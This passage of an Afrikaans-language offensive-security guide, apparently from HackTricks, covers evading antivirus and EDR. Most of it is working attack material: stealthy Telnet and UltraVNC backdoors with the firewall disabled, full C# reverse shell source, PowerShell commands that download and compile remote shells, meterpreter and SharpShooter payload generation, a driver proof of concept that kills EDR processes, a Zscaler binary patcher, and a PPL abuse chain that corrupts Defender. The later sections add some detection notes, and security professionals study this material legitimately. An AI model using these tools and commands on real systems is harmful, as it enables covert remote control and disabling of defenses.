'N Ander hulpmiddel wat dieselfde doen is [**avred**](https://github.com/dobin/avred) met 'n oop webdiens wat die diens by [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) aanbied.

### **Telnet Server**

Tot Windows10 het alle Windows-weergawe met 'n **Telnet server** gekom wat jy (as administrateur) kon installeer deur:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Laat dit **begin** wanneer die stelsel opgestart word en laat dit nou **hardloop**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Verander telnet port** (stealth) en deaktiveer firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Laai dit af vanaf: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (jy wil die bin aflaaie hê, nie die setup nie)

**ON THE HOST**: Voer _**winvnc.exe**_ uit en konfigureer die bediener:

- Skakel die opsie _Disable TrayIcon_ aan
- Stel 'n wagwoord in by _VNC Password_
- Stel 'n wagwoord in by _View-Only Password_

Dan, skuif die binêre _**winvnc.exe**_ en die nuut geskepte lêer _**UltraVNC.ini**_ na binne die **victim**

#### **Reverse connection**

Die **attacker** moet in sy **host** die binêre `vncviewer.exe -listen 5900` uitvoer sodat dit voorbereid sal wees om 'n reverse **VNC connection** te vang. Dan, binne die **victim**: Begin die winvnc daemon `winvnc.exe -run` en voer `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` uit

**WARNING:** Om stealth te handhaaf moet jy 'n paar dinge nie doen nie

- Moet nie `winvnc` begin as dit reeds loop nie of jy sal 'n [popup](https://i.imgur.com/1SROTTl.png) veroorsaak. check of dit loop met `tasklist | findstr winvnc`
- Moet nie `winvnc` begin sonder `UltraVNC.ini` in dieselfde gids nie of dit sal [the config window](https://i.imgur.com/rfMQWcf.png) oopmaak
- Moet nie `winvnc -h` vir hulp loop nie anders sal jy 'n [popup](https://i.imgur.com/oc18wcu.png) veroorsaak

### GreatSCT

Laai dit af vanaf: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Binne GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Begin nou **die lister** met `msfconsole -r file.rc` en **voer die xml payload uit** met:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Huidige defender sal die proses baie vinnig beëindig.**

### Kompileer ons eie reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Eerste C# Revershell

Kompileer dit met:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Gebruik dit met:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# gebruik kompileerder
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Outomatiese aflaai en uitvoering:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators lys: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Gebruik van python vir build injectors voorbeeld:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ander gereedskap
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Meer

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 het 'n klein konsole-hulpmiddel gebruik wat bekendstaan as **Antivirus Terminator** om endpuntbeskerming uit te skakel voordat ransomware afgegee is. Die hulpmiddel bring sy **eie kwesbare maar *ondertekende* driver** en misbruik dit om bevoorregte kernel-operasies uit te voer wat selfs Protected-Process-Light (PPL) AV-dienste nie kan blokkeer nie.

Belangrike punte
1. **Ondertekende driver**: Die lêer wat na skyf geskryf word is `ServiceMouse.sys`, maar die binêre is die regmatig ondertekende driver `AToolsKrnl64.sys` van Antiy Labs’ “System In-Depth Analysis Toolkit”. Omdat die driver 'n geldige Microsoft-handtekening dra, laai dit selfs wanneer Driver-Signature-Enforcement (DSE) geaktiveer is.
2. **Diensinstallasie**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die eerste reël registreer die driver as 'n **kernel-diens** en die tweede begin dit sodat `\\.\ServiceMouse` vanaf gebruikersruimte toeganklik raak.
3. **IOCTLs wat deur die driver blootgestel word**
| IOCTL code | Vermoë                                   |
|-----------:|------------------------------------------|
| `0x99000050` | Beëindig 'n ewekansige proses per PID (gebruik om Defender/EDR-dienste te beëindig) |
| `0x990000D0` | Verwyder 'n ewekansige lêer op skyf |
| `0x990001D0` | Ontlaai die driver en verwyder die diens |

Minimale C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Waarom dit werk**: BYOVD slaan user-mode beskerming heeltemal oor; kode wat in die kernel uitgevoer word kan *protected* prosesse oopmaak, hulle beëindig, of met kernel-objekte mors ongeag PPL/PP, ELAM of ander hardening-funksies.

Opsporing / Versagting
•  Skakel Microsoft se bloklys vir kwesbare drivers aan (`HVCI`, `Smart App Control`) sodat Windows weier om `AToolsKrnl64.sys` te laai.  
•  Moniteer skeppings van nuwe *kernel* dienste en waarsku wanneer 'n driver van 'n wêreld-skryfbare gids gelaai word of nie op die toelaatlys is nie.  
•  Kyk vir user-mode handles na aangepaste device-objekte gevolg deur verdagte `DeviceIoControl`-oproepe.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler se **Client Connector** pas device-posture reëls plaaslik toe en vertrou op Windows RPC om die resultate aan ander komponente te kommunikeer. Twee swak ontwerpskeuses maak 'n volledige omseiling moontlik:

1. Posture-evaluasie gebeur **heeltemal client-side** (n boolean word na die server gestuur).  
2. Interne RPC-endpunte valideer slegs dat die verbindende uitvoerbare lêer **deur Zscaler onderteken** is (via `WinVerifyTrust`).

Deur vier ondertekende binaries op disk te patch kan albei meganismes geneutraliseer word:

| Binary | Original logic patched | Result |
|--------|------------------------|--------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gee altyd `1` terug sodat elke kontrole nakomend is |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ enige (selfs ongetekende) proses kan aan die RPC-pipes bind |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Vervang deur `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Kortgesluit |

Minimale patcher uittreksel:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **Alle** posture checks wys **groen/kompliant**.
* Ongesignede of aangepaste binaries kan die named-pipe RPC-endpunte oopmaak (bv. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Die gekompromitteerde gasheer verkry onbeperkte toegang tot die interne netwerk soos gedefinieer deur die Zscaler-beleid.

Hierdie gevallestudie demonstreer hoe suiwer kliënt-side vertrouensbesluite en eenvoudige handtekeningkontroles met 'n paar byte-patches omseil kan word.

## Misbruik van Protected Process Light (PPL) om AV/EDR met LOLBINs te manipuleer

Protected Process Light (PPL) dwing 'n ondertekenaar/vlak-hiërargie af sodat slegs gelyk-of-hoër beskermde prosesse mekaar kan manipuleer. Aanvallend gesien, as jy 'n PPL-geskikte binary regtens kan lanseer en die argumente daarvan kan beheer, kan jy onskadelike funksionaliteit (bv. logging) omskakel in 'n beperkte, PPL-ondersteunde skryf-primitive teen beskermde gidse wat deur AV/EDR gebruik word.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN-primitief: ClipUp.exe
- Die ondertekende stelsel-binarie `C:\Windows\System32\ClipUp.exe` maak 'n nuwe proses van homself en aanvaar 'n parameter om 'n log-lêer na 'n deur die aanroeper gespesifiseerde pad te skryf.
- Wanneer dit as 'n PPL-proses gestart word, gebeur die lêerskryf met PPL-ondersteuning.
- ClipUp kan nie paaie met spasies verwerk nie; gebruik 8.3-kortpaaie om na normaalweg beskermde plekke te wys.

8.3 kortpad-hulpmiddels
- Lys kortname: `dir /x` in elke ouergids.
- Bepaal kortpad in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Misbruikketting (abstrak)
1) Start die PPL-geskikte LOLBIN (ClipUp) met `CREATE_PROTECTED_PROCESS` deur 'n launcher te gebruik (bv. CreateProcessAsPPL).
2) Gee die ClipUp log-pad argument om 'n lêerskepping in 'n beskermde AV-gids af te dwing (bv. Defender Platform). Gebruik 8.3-kortname indien nodig.
3) As die teiken-binarie normaalweg deur die AV oop of gegrendel is terwyl dit loop (bv. MsMpEng.exe), skeduleer die skryf tydens boot voordat die AV begin deur 'n auto-start service te installeer wat betroubaar vroeër loop. Valideer boot-volgorde met Process Monitor (boot logging).
4) By herlaai gebeur die PPL-gedekte skryf voordat die AV sy binarisse blokkeer, wat die teikenlêer beskadig en die opstart verhoed.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Aantekeninge en beperkings
- Jy kan nie beheer wat ClipUp skryf nie verder as posisie; die primitive is geskik vir korrupsie eerder as presiese inhoudsinvoeging.
- Vereis lokaal admin/SYSTEM om 'n service te installeer/start en 'n herbegin-venster.
- Tydsberekening is krities: die teiken mag nie oop wees nie; opstart-uitvoering vermy lêersluitings.

Opsporing
- Proseskaping van `ClipUp.exe` met ongewone argumente, veral wanneer dit deur nie-standaard launchers as ouerproses geparent is, rondom opstart.
- Nuwe services geconfigureer om verdachte binaries auto-start te laat, en wat konsekwent voor Defender/AV begin. Ondersoek service creation/modification voor Defender opstartfoute.
- Lêer-integriteitsmonitering op Defender binaries/Platform directories; onverwagte lêerskeppings/wysigings deur prosesse met protected-process vlae.
- ETW/EDR telemetry: kyk vir prosesse geskep met `CREATE_PROTECTED_PROCESS` en abnormale gebruik van PPL-vlak deur non-AV binaries.

Teenmaatreëls
- WDAC/Code Integrity: beperk watter signed binaries as PPL mag loop en onder watter ouerprosesse; blokkeer ClipUp-aanroep buite wettige kontekste.
- Service-higiëne: beperk skep/wysiging van auto-start services en monitor start-volgorde-manipulasie.
- Verskaf dat Defender tamper protection en early-launch protections geaktiveer is; ondersoek opstartfoute wat binêre korrupsie aandui.
- Oorweeg om 8.3 short-name generation op volumes wat security tooling huisves te deaktiveer as dit versoenbaar is met jou omgewing (toets deeglik).

Verwysings vir PPL en tooling
- Microsoft Protected Processes oorsig: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
